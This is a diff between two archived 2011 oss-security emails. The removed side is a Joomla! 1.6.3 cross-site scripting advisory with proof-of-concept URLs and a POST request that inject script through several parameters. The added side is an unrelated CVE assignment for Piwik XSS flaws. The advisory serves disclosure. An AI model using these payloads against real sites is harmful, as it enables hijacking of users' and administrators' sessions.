@@ -1,136 +1,36 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/06/28/4
-Message-ID: <BANLkTinokSP7O3x4mP0JxagVgd7cHcwd=Q@mail.gmail.com>
-Date: Tue, 28 Jun 2011 14:25:47 +0800
-From: YGN Ethical Hacker Group <lists@...g.net>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/01/06/15
+Message-ID: <1542530748.193410.1294340225061.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
+Date: Thu, 6 Jan 2011 13:57:05 -0500 (EST)
+From: Josh Bressers <bressers@...hat.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE Request: Joomla! 1.6.3 and lower | Multiple Cross Site Scripting (XSS) Vulnerabilities
+Cc: coley <coley@...re.org>
+Subject: Re: CVE Request: Multiple XSS Vulnerabiliies < Piwik 1.1
 Content-Type: text/plain; charset=utf-8
 
-Joomla! 1.6.3 and lower | Multiple Cross Site Scripting (XSS) Vulnerabilities
+Please use CVE-2011-0004 for the multiple XSS flaws.
+
+Thanks.
+
+-- 
+    JB
 
 
-
-1. OVERVIEW
-
-Joomla! 1.6.3 and lower are vulnerable to multiple Cross Site Scripting issues.
-
-
-2. BACKGROUND
-
-Joomla is a free and open source content management system (CMS) for
-publishing content on the World Wide Web and intranets. It comprises a
-model–view–controller (MVC) Web application framework that can also be
-used independently.
-Joomla is written in PHP, uses object-oriented programming (OOP)
-techniques and software design patterns, stores data in a MySQL
-database, and includes features such as page caching, RSS feeds,
-printable versions of pages, news flashes, blogs, polls, search, and
-support for language internationalization.
-
-
-3. VULNERABILITY DESCRIPTION
-
-Several parameters (QueryString, option, searchword) in Joomla! Core
-components (com_content, com_contact, com_newsfeeds, com_search) are
-not properly sanitized upon submission to the /index.php url, which
-allows attacker to conduct Cross Site Scripting attack. This may allow
-an attacker to create a specially crafted URL that would execute
-arbitrary script code in a victim's browser.
-
-
-4. VERSION AFFECTED
-
-1.6.3 and lower
-
-
-5. PROOF-OF-CONCEPT/EXPLOIT
-
-
-component: com_contact , parameter: QueryString (Browser: All)
-===============================================================
-
-http://attacker.in/joomla163_noseo/index.php?option=com_contact&view=category&catid=26&id=36&Itemid=-1"><script>alert(/XSS/)</script>
-
-
-component:com_content , parameter:  QueryString (Browser: All)
-===============================================================
-
-http://attacker.in/joomla163_noseo/index.php?option=com_content&view=category&id=19&Itemid=260&limit=10&filter_order_Dir=&limitstart=&filter_order=><script>alert(/XSS/)</script>
-
-
-component: com_newsfeeds , parameter: QueryString (Browser: All)
-=================================================================
-
-http://attacker.in/joomla163_noseo/index.php?option=com_newsfeeds&view=category&id=17&whateverehere="><script>alert(/XSS/)</script>&Itemid=253&limit=10&filter_order_Dir=ASC&filter_order=ordering
-
-
-parameter: option (Browser: All)
-====================================
-
-http://attacker.in/joomla163_noseo/index.php?option="><script>alert(/XSS/)</script>&task=reset.request
-
-
-component: com_search, parameter: searchword (Browser: IE, Konqueror)
-=====================================================================
-
-[REQUEST]
-POST /joomla163/index.php HTTP/1.1
-Referer: http://attacker.in/joomla163/
-User-Agent: Konqueror/4.5
-Cache-Control: no-cache
-Content-Type: application/x-www-form-urlencoded
-Host: attacker.in
-Accept-Encoding: gzip, deflate
-Content-Length: 125
-
-option=com_search&searchword='%2522%253C%252Fscript%253E%253Cscript%253Ealert(%252FXSS%252F)%253C%252Fscript%253E&task=search
-[/REQUEST]
-
-This searchword XSS was identified via source code:
-http://yehg.net/lab/pr0js/advisories/joomla/core/1.6.3/xss/XSS%20%5bMode=SEO,NON-SEO%5d/(searchword)_xss_vuln_code_portion.jpg
-
-
-6. IMPACT
-
-Attackers can compromise currently logged-in user/administrator
-session and impersonate arbitrary user actions available under
-/administrator/ functions.
-
-
-7. SOLUTION
-
-Upgrade to Joomla! 1.6.4 or higher
-
-
-8. VENDOR
-
-Joomla! Developer Team
-http://www.joomla.org
-
-
-9. CREDIT
-
-This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
-Ethical Hacker Group, Myanmar.
-
-
-10. DISCLOSURE TIME-LINE
-
-2011-05-26: notified vendor
-2011-06-28: vendor released fix
-2011-06-28: vulnerability disclosed
-
-
-11. REFERENCES
-
-Original Advisory URL:
-http://yehg.net/lab/pr0js/advisories/joomla/core/[joomla_1.6.3]_cross_site_scripting(XSS)
-Vendor Advisory URL:
-http://developer.joomla.org/security/news/352-20110604-xss-vulnerability.html
-XSS FAQ: http://www.cgisecurity.com/xss-faq.html
-OWASP Top 10: http://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project
-CWE-79: http://cwe.mitre.org/data/definitions/79.html
-
-
-#yehg [2011-06-28]
+----- Original Message -----
+> Piwik 1.1 released on Jan 4, 2011, addresses numerous security issues
+> following a security audit by SektionEins (led by Stefan Esser), an
+> internal
+> review, and coordinated disclosures from Jarosław Sajko
+> (Pentesters.pl) and
+> Fabian Becker.
+> 
+> Notably, versions of Piwik prior to 1.1 contain multiple persistent
+> and
+> reflective XSS vulnerabilities through unescaped parameters and/or
+> output.
+> 
+> Security advisory:
+> http://piwik.org/blog/2011/01/piwik-1-1-security-advisory/
+> Other advisory:
+> http://piwik.org/blog/2011/01/professional-security-audit-in-piwik/
+> Changelog: http://piwik.org/blog/2011/01/piwik-1-1-2/
